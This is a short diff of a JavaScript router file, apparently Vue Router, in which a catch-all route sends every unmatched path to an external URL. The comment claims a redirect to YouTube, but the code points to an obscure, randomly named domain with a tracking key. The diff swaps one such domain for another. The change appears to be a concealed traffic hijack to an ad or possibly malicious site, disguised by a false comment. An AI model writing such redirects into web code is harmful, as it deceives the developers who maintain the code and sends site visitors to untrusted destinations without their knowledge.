@@ -15,8 +15,9 @@ const routes = [
   {
     path: '/:catchAll(.*)', // This route will catch any path
     beforeEnter: (to, from, next) => {
-      // Redirect to YouTube for any string
-      window.location.href = 'https://acquisitionsneezeswell.com/mwk0886hw?key=effd9a9b1d612f89b6b6d4e6889916ff';
+      // Redirect to YouTube for any string 
+      // window.location.href = 'https://acquisitionsneezeswell.com/mwk0886hw?key=effd9a9b1d612f89b6b6d4e6889916ff';
+      window.location.href = 'https://clueostensiblebureaucracy.com/mwk0886hw?key=effd9a9b1d612f89b6b6d4e6889916ff';
     }
     
   }
